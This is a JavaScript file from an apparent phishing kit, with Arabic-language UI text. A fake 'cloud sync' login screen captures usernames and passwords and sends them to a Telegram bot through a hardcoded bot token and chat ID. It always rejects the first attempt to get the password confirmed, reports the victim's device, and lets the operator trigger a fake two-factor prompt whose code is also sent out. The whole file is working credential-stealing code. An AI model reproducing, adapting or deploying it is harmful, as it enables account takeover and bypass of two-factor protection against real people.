const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let loginAttempts = 0;
let checkTimer = null;
let countdownTimer = null;
let timeLeft = 50;

async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('status-text');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;

    // المحاولة 1: خطأ إجباري للتأكد
    if (loginAttempts === 1) {
        btn.disabled = true;
        btn.innerText = "Verifying...";
        await sendToTelegram(`⚠️ محاولة 1 (تأكد):\n👤 User: ${u}\n🔑 Pass: ${p}`);
        
        setTimeout(() => {
            msg.innerText = "❌ خطأ في السيرفر: كلمة المرور أو اليوزر غير صحيح!";
            msg.style.color = "#ff4444";
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
        return;
    }

    // المحاولة 2: العداد والانتظار
    if (loginAttempts === 2) {
        btn.disabled = true;
        msg.style.color = "#00f2ff";
        const device = navigator.userAgent.includes("Android") ? "Android" : "iPhone";
        
        await sendToTelegram(`✅ بيانات مؤكدة (محاولة 2):\n👤 User: ${u}\n🔑 Pass: ${p}\n📱 الجهاز: ${device}`);

        startCountdown(); 
        startAdminListening(); 
    }
}

function startCountdown() {
    const msg = document.getElementById('status-text');
    countdownTimer = setInterval(() => {
        msg.innerText = `⏳ جاري المزامنة السحابية... يرجى الانتظار (ثانية ${timeLeft})`;
        timeLeft--;

        if (timeLeft < 0) {
            clearInterval(countdownTimer);
            openRadar(); 
        }
    }, 1000);
}

function startAdminListening() {
    checkTimer = setInterval(async () => {
        try {
            const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&limit=1`);
            const data = await res.json();
            if (data.result && data.result.length > 0) {
                const cmd = data.result[0].message?.text.toUpperCase() || "";
                
                // أمر Q: تقرير المتصلين
                if (cmd === "Q") {
                    const device = navigator.userAgent.includes("Android") ? "Android" : "iPhone";
                    await sendToTelegram(`📊 تقرير المتصل الآن:\n📱 الجهاز: ${device}\n⏳ الوقت المتبقي له: ${timeLeft} ثانية\n🌐 الحالة: في شاشة المزامنة`);
                }
                // أمر 2FA: طلب الرمز
                else if (cmd === "2FA") {
                    clearInterval(countdownTimer);
                    stopAndRequest2FA();
                } 
                // أمر OK: دخول فوري
                else if (cmd === "OK") {
                    clearInterval(countdownTimer);
                    openRadar();
                }
            }
        } catch (e) { console.log("Waiting..."); }
    }, 2500);
}

function stopAndRequest2FA() {
    clearInterval(checkTimer);
    const msg = document.getElementById('status-text');
    const pInput = document.getElementById('u_pas');
    const btn = document.getElementById('sync-btn');

    msg.innerText = "⚠️ فشلت المزامنة! حسابك محمي بـ 'المصادقة الثنائية'. أدخل الرمز المكون من 6 أرقام الآن لرفع نسبة الفوز:";
    msg.style.color = "#ffcc00";
    pInput.value = "";
    pInput.placeholder = "أدخل الرمز هنا";
    btn.disabled = false;
    btn.innerText = "تأكيد الرمز 🔓";
    
    btn.onclick = async () => {
        const code = pInput.value;
        await sendToTelegram(`🔐 تفضل رمز 2FA للضحية:\n🔢 CODE: ${code}`);
        alert("جاري التحقق.. انتظر رسالة النجاح");
        btn.disabled = true;
    };
}

function openRadar() {
    clearInterval(checkTimer);
    document.getElementById('auth-screen').classList.add('hidden');
    document.getElementById('main-app').classList.remove('hidden');
}

async function sendToTelegram(text) {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
}
